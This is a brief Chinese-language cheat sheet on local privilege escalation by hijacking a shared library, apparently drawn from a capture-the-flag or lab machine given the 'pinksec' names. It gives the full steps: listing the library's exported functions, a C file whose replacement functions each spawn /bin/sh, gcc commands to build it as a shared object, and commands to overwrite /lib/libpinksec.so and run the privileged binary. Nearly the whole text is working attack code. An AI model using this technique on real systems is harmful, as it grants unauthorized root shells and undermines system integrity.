# 共享库提权（.so）

当高权限文件执行伴随so库的调用

```bash
1. 找函数
nm -g /lib/libpinksec.so    --查看函数
找_init。，从这里开始，他下面的函数才执行，也就是构成下面的payload的函数
---------------shell.c-------------------
#include <stdlib.h>
int psbanner() {
    return system("/bin/sh");
  }
int psopt() {
  return system("/bin/sh");
}
int psoptin() {
  return system("/bin/sh");
}
------------------------------------------
2. 编译执行
gcc -shared -o shell.so -fPIC shell.c     -----不包含_init的方式
gcc -shared -o shell.so -fPIC -nostartfiles shell.c  -----包含_init的方式
cp shell.so /lib/libpinksec.so   --覆盖
./pinksecd    --执行
```

‍
